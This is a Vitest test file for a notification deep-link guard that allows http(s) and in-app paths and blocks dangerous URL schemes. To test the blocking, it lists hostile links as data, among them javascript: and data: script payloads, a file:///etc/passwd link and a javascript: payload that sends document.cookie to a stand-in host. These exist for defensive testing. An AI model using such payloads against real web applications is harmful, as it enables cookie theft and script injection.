// @vitest-environment jsdom
/**
 * The notification deep-link guard (`navigate-deep-link`): `isSafeDeepLink`
 * scheme allowlisting and `navigateDeepLink` routing (new-tab for http(s),
 * in-app event for root-relative). jsdom; pure guard logic, no network.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { isSafeDeepLink, navigateDeepLink } from "./navigate-deep-link";

describe("isSafeDeepLink", () => {
  it("accepts http(s) URLs and root-relative app paths", () => {
    expect(isSafeDeepLink("https://example.com/x")).toBe(true);
    expect(isSafeDeepLink("http://example.com")).toBe(true);
    expect(isSafeDeepLink("/inbox")).toBe(true);
    expect(isSafeDeepLink("/apps/files?id=1")).toBe(true);
  });

  it("rejects dangerous schemes and scheme-relative URLs", () => {
    expect(isSafeDeepLink("javascript:alert(1)")).toBe(false);
    expect(isSafeDeepLink("JavaScript:alert(1)")).toBe(false);
    expect(isSafeDeepLink("data:text/html,<script>alert(1)</script>")).toBe(
      false,
    );
    expect(isSafeDeepLink("vbscript:msgbox(1)")).toBe(false);
    expect(isSafeDeepLink("file:///etc/passwd")).toBe(false);
    expect(isSafeDeepLink("customapp://do-thing")).toBe(false);
    expect(isSafeDeepLink("//attacker.example/x")).toBe(false);
    expect(isSafeDeepLink("")).toBe(false);
  });
});

describe("navigateDeepLink", () => {
  let openSpy: ReturnType<typeof vi.spyOn>;
  let dispatchSpy: ReturnType<typeof vi.spyOn>;
  let assignSpy: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    dispatchSpy = vi.spyOn(window, "dispatchEvent");
    // Guard against any regression that reintroduces a top-window navigation.
    assignSpy = vi.fn();
    Object.defineProperty(window, "location", {
      configurable: true,
      value: { ...window.location, assign: assignSpy },
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("opens an http(s) deep link in a new noopener tab, never the top window", () => {
    navigateDeepLink("https://example.com/x");
    expect(openSpy).toHaveBeenCalledWith(
      "https://example.com/x",
      "_blank",
      "noopener,noreferrer",
    );
    expect(assignSpy).not.toHaveBeenCalled();
  });

  it("dispatches an in-app navigate event for a root-relative path", () => {
    navigateDeepLink("/apps/files");
    const evt = dispatchSpy.mock.calls
      .map((c: unknown[]) => c[0])
      .find((e: unknown): e is CustomEvent => e instanceof CustomEvent);
    expect(evt?.type).toBe("eliza:navigate:view");
    expect((evt?.detail as { viewId?: string }).viewId).toBe("apps");
    expect(openSpy).not.toHaveBeenCalled();
  });

  it("opens the floating chat for /chat instead of a routed navigation", () => {
    navigateDeepLink("/chat");
    const types = dispatchSpy.mock.calls
      .map((c: unknown[]) => c[0])
      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
      .map((e: CustomEvent) => e.type);
    expect(types).toContain("eliza:chat:open");
    expect(types).not.toContain("eliza:navigate:view");
  });

  it("prefills the chat composer for /chat?prefill=<text> (never auto-sends)", () => {
    navigateDeepLink("/chat?prefill=Connect%20my%20calendar");
    const evt = dispatchSpy.mock.calls
      .map((c: unknown[]) => c[0])
      .find(
        (e: unknown): e is CustomEvent =>
          e instanceof CustomEvent && e.type === "eliza:chat:prefill",
      );
    expect((evt?.detail as { text?: string }).text).toBe(
      "Connect my calendar",
    );
    const types = dispatchSpy.mock.calls
      .map((c: unknown[]) => c[0])
      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
      .map((e: CustomEvent) => e.type);
    expect(types).not.toContain("eliza:navigate:view");
  });

  it.each([
    "javascript:fetch('//evil/'+document.cookie)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "customapp://x",
    "//attacker.example/x",
  ])("performs no navigation for the dangerous deep link %s", (link) => {
    navigateDeepLink(link);
    expect(openSpy).not.toHaveBeenCalled();
    expect(assignSpy).not.toHaveBeenCalled();
    const navEvt = dispatchSpy.mock.calls
      .map((c: unknown[]) => c[0])
      .find(
        (e: unknown): e is CustomEvent =>
          e instanceof CustomEvent && e.type === "eliza:navigate:view",
      );
    expect(navEvt).toBeUndefined();
  });
});
